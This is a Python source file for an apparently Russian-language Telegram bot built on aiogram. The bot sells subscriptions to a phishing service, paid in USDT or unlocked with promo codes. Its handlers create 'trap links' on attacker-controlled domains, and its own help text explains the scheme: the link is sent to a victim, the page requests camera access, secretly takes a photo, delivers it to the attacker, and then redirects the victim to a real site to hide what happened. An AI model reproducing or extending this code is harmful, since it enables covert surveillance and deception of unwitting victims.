import uuid
from aiogram import Router, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.fsm.context import FSMContext
from datetime import datetime

from config import bot, ADMIN_ID, LinkState, PromoState
from database import load_users, save_users, load_promocodes, save_promocodes, load_links, save_links, load_domains
from services import (
    get_sub_status, add_subscription, create_invoice, check_invoice, 
    is_user_blocked, fetch_url_metadata
)
from keyboards import (
    get_start_text, get_start_kb, get_cancel_kb, get_plans_kb, get_sub_menu_kb, get_domains_selection_kb
)

router = Router()
router.message.filter(F.chat.type == "private")
router.callback_query.filter(F.message.chat.type == "private")

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    if is_user_blocked(message.from_user.id): return
    await state.clear()
    
    users = load_users()
    uid = str(message.from_user.id)
    
    if uid not in users:
        users[uid] = {
            "expiry": None,
            "joined_at": datetime.now().isoformat(),
            "is_blocked": False,
            "builds_balance": 0
        }
    
    users[uid]["username"] = message.from_user.username
    users[uid]["first_name"] = message.from_user.first_name
    users[uid]["last_name"] = message.from_user.last_name
    save_users(users)
        
    await message.answer(get_start_text(message.from_user, users.get(uid)), reply_markup=get_start_kb(message.from_user.id), parse_mode="HTML")

@router.callback_query(F.data == "cancel_build")
async def cb_cancel(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    users = load_users()
    uid = str(callback.from_user.id)
    user_data = users.get(uid)

    try:
        await callback.message.edit_text(get_start_text(callback.from_user, user_data), reply_markup=get_start_kb(callback.from_user.id), parse_mode="HTML")
    except:
        await callback.message.answer(get_start_text(callback.from_user, user_data), reply_markup=get_start_kb(callback.from_user.id), parse_mode="HTML")
    await callback.answer()

@router.callback_query(F.data == "info")
async def cb_info(callback: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="cancel_build")]
    ])
    
    text = (
        "ℹ️ <b>Как это работает?</b>\n\n"
        "1. Ты создаешь ссылку через кнопку <b>🔗 Создать ссылку</b>.\n"
        "2. Бот просит указать <b>реальный сайт</b>, куда человек должен попасть в итоге (например, https://google.com).\n"
        "3. Бот выдает тебе <b>фейковую ссылку</b>.\n"
        "4. Ты кидаешь её жертве. Она открывает, сайт просит доступ к камере.\n"
        "5. Как только доступ дан — делается фото и отправляется тебе в личку.\n"
        "6. Жертву перекидывает на реальный сайт, который ты указал."
    )
    
    if isinstance(callback, Message):
        await callback.answer(text, reply_markup=kb, parse_mode="HTML")
    else:
        try:
            await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
        except:
            await callback.message.answer(text, reply_markup=kb, parse_mode="HTML")
        await callback.answer()

# --- Оплата и Промокоды ---
@router.callback_query(F.data == "sub")
async def cb_sub(callback: CallbackQuery):
    await callback.message.edit_text("💳 <b>Оплата подписки</b>\nВыберите способ:", reply_markup=get_sub_menu_kb(), parse_mode="HTML")
    await callback.answer()

@router.callback_query(F.data == "buy_menu")
async def cb_buy_menu(callback: CallbackQuery):
    await callback.message.edit_text("Выберите тариф:", reply_markup=get_plans_kb())
    await callback.answer()

@router.callback_query(F.data == "enter_promo")
async def cb_enter_promo(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("✍️ <b>Укажите ваш промокод:</b>", reply_markup=get_cancel_kb(), parse_mode="HTML")
    await state.set_state(PromoState.waiting_for_code)
    await callback.answer()

@router.message(PromoState.waiting_for_code)
async def process_user_promo(message: Message, state: FSMContext):
    code_text = message.text.strip()
    uid = str(message.from_user.id)
    
    promocodes = load_promocodes()
    users = load_users()
    
    if code_text not in promocodes:
        await message.answer("❌ Промокод не найден.", reply_markup=get_cancel_kb())
        return
        
    promo = promocodes[code_text]
    if promo["activations_left"] <= 0:
        await message.answer("❌ Этот промокод закончился.", reply_markup=get_cancel_kb())
        return
        
    user_used = users.get(uid, {}).get("used_promocodes", [])
    if code_text in user_used:
        await message.answer("❌ Вы уже активировали этот промокод.", reply_markup=get_cancel_kb())
        return
        
    p_type = promo.get("type", "hours")
    p_value = promo.get("value", 0)
    
    if p_type == "hours":
        add_subscription(uid, hours=p_value)
        desc = f"{p_value} ч. подписки"
    else:
        add_subscription(uid, builds=p_value)
        desc = f"{p_value} сборок (ссылок)"
        
    promocodes[code_text]["activations_left"] -= 1
    save_promocodes(promocodes)
    
    # Перезагружаем users для актуальности
    users = load_users()
    if uid not in users: users[uid] = {}
    current_used = users[uid].get("used_promocodes", [])
    current_used.append(code_text)
    users[uid]["used_promocodes"] = current_used
    save_users(users)
    
    await state.clear()
    await message.answer(f"✅ <b>Промокод активирован!</b>\nПолучено: {desc}", parse_mode="HTML")
    await message.answer(get_start_text(message.from_user, users.get(uid)), reply_markup=get_start_kb(message.from_user.id), parse_mode="HTML")

@router.callback_query(F.data.startswith("buy_"))
async def cb_buy(callback: CallbackQuery):
    _, amount, hours = callback.data.split("_")
    pay_url, invoice_id = await create_invoice(amount)
    
    if not pay_url:
        await callback.answer("Ошибка: Токен CryptoBot не настроен!", show_alert=True)
        return
        
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 Оплатить", url=pay_url)],
        [InlineKeyboardButton(text="✅ Проверить оплату", callback_data=f"check_{invoice_id}_{hours}_{amount}")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_build")]
    ])
    
    await callback.message.edit_text(
        f"💳 <b>Счет на оплату</b>\n\nСумма: <b>{amount} USDT</b>\nСрок: <b>{int(hours)//24} дн.</b>\n\nПосле оплаты нажмите кнопку проверки.",
        reply_markup=kb, parse_mode="HTML"
    )
    await callback.answer()

@router.callback_query(F.data.startswith("check_"))
async def cb_check_payment(callback: CallbackQuery):
    parts = callback.data.split("_")
    invoice_id = parts[1]
    hours = parts[2]
    amount = float(parts[3]) if len(parts) > 3 else 0
    
    is_paid = await check_invoice(invoice_id)
    if is_paid:
        add_subscription(callback.from_user.id, hours=int(hours), amount=amount)
        await callback.message.answer("✅ <b>Оплата прошла успешно!</b>\nПодписка активирована.", parse_mode="HTML")
        
        users = load_users()
        uid = str(callback.from_user.id)
        
        await callback.message.answer(get_start_text(callback.from_user, users.get(uid)), reply_markup=get_start_kb(callback.from_user.id), parse_mode="HTML")
        try: await callback.message.delete() 
        except: pass
    else:
        await callback.answer("❌ Оплата еще не поступила. Попробуйте через минуту.", show_alert=True)

# --- Создание ссылки ---
@router.callback_query(F.data == "create_link")
async def cb_create_link(callback: CallbackQuery, state: FSMContext):
    if is_user_blocked(callback.from_user.id): return
    
    user_id = callback.from_user.id
    status_str = get_sub_status(user_id)
    
    has_access = False
    if user_id == ADMIN_ID:
        has_access = True
    elif status_str not in ["Не активна", "Истекла"]:
        has_access = True

    if not has_access:
        debug_info = f"(Статус: {status_str})"
        await callback.answer(f"❌ Нужна активная подписка или пакет ссылок! {debug_info}", show_alert=True)
        return

    await callback.message.answer(
        "✍️ <b>Пришли ссылку-ловушку.</b>\n"
        "Это сайт, куда жертва попадет ПОСЛЕ того, как сделает фото.",
        reply_markup=get_cancel_kb(),
        parse_mode="HTML"
    )
    await state.set_state(LinkState.waiting_for_target_url)
    await callback.answer()

@router.message(LinkState.waiting_for_target_url)
async def process_target_url(message: Message, state: FSMContext):
    target_url = message.text.strip()
    
    if not target_url.startswith("http"):
        if not target_url.startswith("www"):
             await message.answer("❌ Ссылка должна начинаться с http:// или https://", reply_markup=get_cancel_kb())
             return
        target_url = "https://" + target_url
        
    # Сохраняем URL в состоянии
    await state.update_data(target_url=target_url)
    
    # Загружаем домены
    domains = load_domains()
    domain_list = sorted(list(domains.keys()))
    
    if not domain_list:
        await message.answer("❌ В системе нет активных доменов. Обратитесь к администратору.", reply_markup=get_cancel_kb())
        await state.clear()
        return
        
    # Предлагаем выбрать домен
    await message.answer(
        "🌐 <b>Выберите активный домен:</b>\n"
        "Через этот домен будет работать ваша ссылка-ловушка.",
        reply_markup=get_domains_selection_kb(domain_list, 0),
        parse_mode="HTML"
    )
    await state.set_state(LinkState.waiting_for_domain_selection)

@router.callback_query(F.data.startswith("sd_p_"))
async def cb_select_domain_page(callback: CallbackQuery):
    page = int(callback.data.split("_")[2])
    domains = load_domains()
    domain_list = sorted(list(domains.keys()))
    
    await callback.message.edit_reply_markup(reply_markup=get_domains_selection_kb(domain_list, page))
    await callback.answer()

@router.callback_query(F.data.startswith("sd_"))
async def cb_select_domain(callback: CallbackQuery, state: FSMContext):
    domain = callback.data.split("_", 1)[1] # sd_example.com -> example.com
    
    data = await state.get_data()
    target_url = data.get("target_url")
    user_id = callback.from_user.id
    
    if not target_url:
        await callback.answer("Ошибка: URL не найден. Начните заново.", show_alert=True)
        await state.clear()
        return

    # Генерируем ID
    link_id = str(uuid.uuid4())
    
    # Получаем метаданные (превью)
    msg_wait = await callback.message.answer("🔄 Генерация превью...")
    meta_data = await fetch_url_metadata(target_url)
    await msg_wait.delete()

    # Сохраняем в базу
    links = load_links()
    links[link_id] = {
        "owner_id": user_id,
        "redirect_url": target_url,
        "created_at": datetime.now().isoformat(),
        "meta": meta_data
    }
    save_links(links)
    
    # Списываем "билд" (если не админ и нет подписки по времени)
    users = load_users()
    uid = str(user_id)
    has_time = False
    if uid in users:
        exp_str = users[uid].get("expiry")
        if exp_str and datetime.fromisoformat(exp_str) > datetime.now():
            has_time = True
    
    if not has_time and user_id != ADMIN_ID:
        add_subscription(user_id, builds=-1)
        users = load_users() # Перезагружаем после списания
    
    # Формируем финальную ссылку с выбранным доменом
    # Убираем http/https если они есть в домене, чтобы добавить свой (или используем как есть если там уже есть протокол)
    clean_domain = domain.replace("https://", "").replace("http://", "").strip("/")
    final_link = f"https://{clean_domain}/verify/{link_id}"
    
    await callback.message.edit_text(
        f"✅ <b>Ссылка готова!</b>\n\n"
        f"🔗 <code>{final_link}</code>\n\n"
        f"🎯 Перенаправляет на: {target_url}\n"
        f"📸 Фото придет в этот чат.",
        parse_mode="HTML",
        disable_web_page_preview=True
    )
    
    user_data = users.get(str(user_id))
    await callback.message.answer(get_start_text(callback.from_user, user_data), reply_markup=get_start_kb(callback.from_user.id), parse_mode="HTML")
    await state.clear()
    await callback.answer()